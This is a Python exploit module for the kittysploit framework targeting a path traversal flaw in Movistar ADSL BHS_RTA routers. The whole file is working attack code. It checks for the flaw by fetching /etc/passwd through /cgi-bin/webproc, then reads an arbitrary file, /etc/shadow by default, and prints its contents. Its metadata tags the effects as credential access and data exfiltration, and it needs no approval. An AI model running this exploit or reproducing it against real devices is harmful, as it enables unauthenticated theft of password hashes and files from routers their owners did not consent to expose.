#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Movistar ADSL Router BHS_RTA Path Traversal"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Movistar ADSL Router BHS_RTA Path Traversal',
        'description': 'Module exploits Movistar ADSL Router BHS_RTA Path Traversal vulnerability which allows to read any file on the system.',
        'author': ['Todor Donev', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/40734/'],
        'tags': ['iot', 'router', 'lfi', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    filename = OptString("/etc/shadow", "File to read")

    def run(self):
        if self.check():
            path = "/cgi-bin/webproc?getpage={}&var:language=es_es&var:page=".format(self.filename)

            response = self.http_request(
                method="GET",
                path=path,
            )
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Success! File: %s" % self.filename)
                print_info(response.text)
            else:
                print_error("Exploit failed")
        else:
            print_error("Device seems to be not vulnerable")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/cgi-bin/webproc?getpage=/etc/passwd&var:language=es_es&var:page=",
        )
        if response is None:
            return False  # target is not vulnerable

        if ("/etc/passwd" in (response.text or '')):
            return True  # target vulnerable

        return False  # target is not vulnerable
